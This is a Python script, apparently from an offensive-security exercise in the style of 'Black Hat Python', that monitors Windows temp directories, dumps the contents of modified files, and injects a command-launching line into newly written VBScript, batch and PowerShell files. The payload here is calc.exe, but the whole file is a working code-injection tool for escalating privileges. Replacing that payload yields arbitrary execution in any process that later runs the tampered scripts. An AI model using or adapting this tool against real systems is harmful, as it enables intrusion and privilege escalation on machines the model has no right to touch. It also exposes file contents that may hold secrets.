import tempfile
import threading
import win32file
import win32con
import os

dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

command = "calc.exe"
file_types = {'.vbs': ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command],
              '.bat': ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command],
              '.ps1': ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]}
# saving the files already written,the flag 'bhpmarker' seems not working well.Even though，several FILE_MODIFIED event can be
# triggered once writing a file.
inject_files = set()


def inject_code(full_filename, extension, contents):
    if file_types[extension][0] in contents or full_filename in inject_files:
        return
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    inject_files.add(full_filename)
    print("[\o/] Injected code")


def start_monitor(path_to_watch):
    FILE_LIST_DIRECTORY = 0X0001
    h_directory = win32file.CreateFile(path_to_watch,
                                       FILE_LIST_DIRECTORY,
                                       win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                                       None,
                                       win32con.OPEN_EXISTING,
                                       win32con.FILE_FLAG_BACKUP_SEMANTICS,
                                       None)
    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action == FILE_CREATED:
                    print("[+]Created %s" % full_filename)
                elif action == FILE_DELETED:
                    print("[+]Deleted %s" % full_filename)
                elif action == FILE_MODIFIED:
                    print("[+]Modified %s" % full_filename)
                    print("[vvv]Dumping contents...")

                    try:
                        with open(full_filename, "r") as f:
                            contents = f.read()
                        print(contents)
                        print("Dump complete!")
                    except:
                        print("[!!!]Failed.")
                    filename,extension = os.path.splitext(full_filename)
                    if extension in file_types:
                        print("inject code")
                        inject_code(full_filename,extension,contents)
                elif action == FILE_RENAMED_FROM:
                    print("[<]Renamed from: %s" % full_filename)
                elif action == FILE_RENAMED_TO:
                    print("[>]Renamed to: %s" % full_filename)
                else:
                    print("[???]Unknown:%s" % full_filename)
        except:
            pass


if __name__ == '__main__':
    for path in dirs_to_monitor:
        monitor_thread = threading.Thread(target=start_monitor, args=(path,))
        print("Spawning monitoring thread for path:%s" % path)
        monitor_thread.start()
